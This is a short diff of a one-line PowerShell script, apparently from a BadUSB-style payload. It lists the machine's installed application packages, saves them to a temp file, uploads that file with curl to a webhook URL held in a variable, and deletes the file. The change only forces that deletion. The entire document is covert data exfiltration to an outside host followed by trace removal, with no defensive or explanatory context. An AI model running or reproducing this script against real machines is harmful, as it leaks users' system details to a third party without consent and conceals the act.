@@ -1,1 +1,1 @@
-$hookurl = $dc; $path = "$env:TEMP\a.txt"; Get-AppxPackage | Out-File -FilePath $path; curl.exe -F "file1=@$path" $hookurl;Remove-Item $path
+$hookurl = $dc; $path = "$env:TEMP\a.txt"; Get-AppxPackage | Out-File -FilePath $path; curl.exe -F "file1=@$path" $hookurl;Remove-Item -Path $path -Force
